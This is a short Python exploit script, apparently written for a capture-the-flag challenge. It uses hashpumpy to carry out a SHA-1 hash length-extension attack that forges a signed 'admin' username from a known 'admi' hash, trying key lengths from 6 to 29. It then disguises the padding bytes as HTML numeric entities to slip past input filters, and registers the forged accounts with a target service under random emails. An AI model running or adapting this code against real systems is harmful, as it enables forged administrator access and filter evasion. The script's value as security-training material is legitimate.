# hello
from os import stat
import hashpumpy
import urllib.parse
import string

from functions import stick_register, stick_login

import random
domains = [ "hotmail.com", "gmail.com", "aol.com", "mail.com" , "mail.kz", "yahoo.com"]
letters = string.ascii_lowercase[:12]

def get_random_domain(domains):
    return random.choice(domains)

def get_random_name(letters, length):
    return ''.join(random.choice(letters) for _ in range(length))

def generate_random_emails(nb, length):
    return [get_random_name(letters, length) + '%40' + get_random_domain(domains) for _ in range(nb)]

def main():
    # admi / '4dd28ad0560441245de6fda3973890eeb41b702d' / variable key length
    results = []
    for i in range(6, 30):
        data = hashpumpy.hashpump('4dd28ad0560441245de6fda3973890eeb41b702d', "admi", 'n', i)
        results.append(data)

    for r in results:
        register_user = urllib.parse.quote_from_bytes(r[1])
        print("{} => {}".format(r[0], register_user))

        evading_user = register_user.replace('%00', '&#00000000').replace('%80', '&#00000128')
        #register_user = "4&#00000004&#0000097&#0000097"
        register_email = generate_random_emails(1, 15)[0]
        register_pwd   = get_random_name(letters, 12)

        

        print(evading_user, register_email, register_pwd)
        status, data = stick_register(evading_user, register_email, register_pwd)
        print("Code: {}".format(status))
        if status == 200:
            resp = data.getvalue().decode()
            if resp.find('Missing') > 0:
                print("KO: Missing fields")
                break 
            elif resp.find('Invalid') > 0: 
                print("KO: Invalid fields")
                break
            elif resp.find('User exist') > 0:
                print("KO: User exist, try with another email")
                break
            elif resp.find('Registered !') > 0:
                print("OK: Registered")
            else:
                print(resp)

        #status = stick_login(register_email, register_user)
        #print("Code: {}".format(status))
        break

if __name__ == "__main__":
    main()